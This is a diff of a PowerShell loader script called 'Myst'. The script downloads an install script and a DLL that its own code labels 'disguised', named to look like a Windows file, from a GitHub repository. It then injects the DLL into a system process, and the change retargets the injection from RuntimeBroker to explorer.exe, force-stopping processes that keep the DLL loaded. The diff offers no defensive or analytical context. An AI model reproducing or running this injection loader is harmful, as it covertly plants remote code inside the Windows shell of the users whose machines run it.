@@ -16,8 +16,8 @@ $defaultScriptUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/insta
 $defaultUpdateManifestUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/update.json'
 $defaultDisguisedDllUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/sbscmp64_mscorwks.dll'
 $script:UpdateManifestPath = Join-Path $env:ProgramData 'Myst\update.json'
-$n = 'RuntimeBroker'
-$x = "$env:SystemRoot\System32\$n.exe"
+$n = 'explorer'
+$x = Join-Path $env:SystemRoot 'explorer.exe'
 $script:DllExecuterInstallPath = Join-Path $env:ProgramData 'Myst\install.ps1'
 
 function Resolve-InstallScriptPath {
@@ -585,7 +585,12 @@ function Remove-RuntimeBrokerDll {
         }
     }
 
-    Write-Step "  Unload incomplete, stopping RuntimeBroker PID $($Process.Id) only..." -Color Yellow
+    Write-Step "  Unload incomplete — leaving $($Process.ProcessName) PID $($Process.Id) running." -Color Yellow
+    if ($Process.ProcessName -ieq 'explorer') {
+        return $false
+    }
+
+    Write-Step "  Stopping $($Process.ProcessName) PID $($Process.Id)..." -Color Yellow
     try {
         Stop-Process -Id $Process.Id -Force -ErrorAction Stop
         Wait-Process -Id $Process.Id -ErrorAction SilentlyContinue
@@ -620,12 +625,14 @@ function Clear-AllRuntimeBrokerDll {
 function Start-RuntimeBrokerInstance {
     param([string]$DllPath)
 
-    Write-Step 'Starting a new RuntimeBroker instance...' -Color Gray
-    Start-Process $x -ErrorAction SilentlyContinue | Out-Null
-    if (-not (Wait-ForProcess -Name $n -Present $true -TimeoutSeconds 10)) {
-        return $null
+    Write-Step 'Waiting for Explorer shell...' -Color Gray
+    if (-not (Wait-ForProcess -Name $n -Present $true -TimeoutSeconds 15)) {
+        Start-Process $x -ErrorAction SilentlyContinue | Out-Null
+        if (-not (Wait-ForProcess -Name $n -Present $true -TimeoutSeconds 15)) {
+            return $null
+        }
     }
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 2
     return (Get-RuntimeBrokerInjectionTarget -DllPath $DllPath)
 }
 
@@ -651,7 +658,7 @@ function Restart-ExplorerShell {
 function Invoke-Sbscmp30LoadFromDisk {
     param([switch]$SkipUnload)
 
-    Write-Step 'Starting RuntimeBroker load...' -Color Cyan
+    Write-Step 'Starting Myst host load (Explorer)...' -Color Cyan
 
     if (-not (Ensure-Sbscmp30OnDisk)) {
         Write-Step 'Ensure-Sbscmp30OnDisk failed.' -Color Red
@@ -669,7 +676,11 @@ function Invoke-Sbscmp30LoadFromDisk {
         Clear-AllRuntimeBrokerDll -DllPath $p | Out-Null
 
         foreach ($stubborn in @(Get-RuntimeBrokersWithDll -DllPath $p)) {
-            Write-Step "Force-stopping stubborn RuntimeBroker PID $($stubborn.Id)..." -Color Yellow
+            if ($stubborn.ProcessName -ieq 'explorer') {
+                Remove-RuntimeBrokerDll -Process $stubborn -DllPath $p | Out-Null
+                continue
+            }
+            Write-Step "Force-stopping stubborn host PID $($stubborn.Id)..." -Color Yellow
             try {
                 Stop-Process -Id $stubborn.Id -Force -ErrorAction Stop
             } catch {
@@ -698,18 +709,18 @@ function Invoke-Sbscmp30LoadFromDisk {
             }
         }
         if (-not $targetProc) {
-            Write-Step 'No usable RuntimeBroker instance available.' -Color Red
+            Write-Step 'No usable Explorer host available.' -Color Red
             continue
         }
 
         $targetPid = $targetProc.Id
-        Write-Step "Injecting sbscmp64 into RuntimeBroker PID $targetPid (attempt $($retry + 1))..." -Color Gray
+        Write-Step "Injecting sbscmp64 into Explorer PID $targetPid (attempt $($retry + 1))..." -Color Gray
 
         if ([Injector]::X($targetPid, $p)) {
             Start-Sleep -Seconds 2
             $refreshed = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
             if ($refreshed -and (Test-RuntimeBrokerHasDll -Process $refreshed -DllPath $p)) {
-                Write-Step "sbscmp64 loaded in RuntimeBroker PID $targetPid" -Color Green
+                Write-Step "sbscmp64 loaded in Explorer PID $targetPid" -Color Green
                 return $true
             }
 
@@ -877,7 +888,7 @@ function Invoke-LoadAllDlls {
         }
     }
 
-    Write-Step 'RuntimeBroker load (sbscmp64)...' -Color Cyan
+    Write-Step 'Myst host load (Explorer / sbscmp64)...' -Color Cyan
 
     if (Invoke-Sbscmp30LoadFromDisk -SkipUnload) {
         Write-Host ''
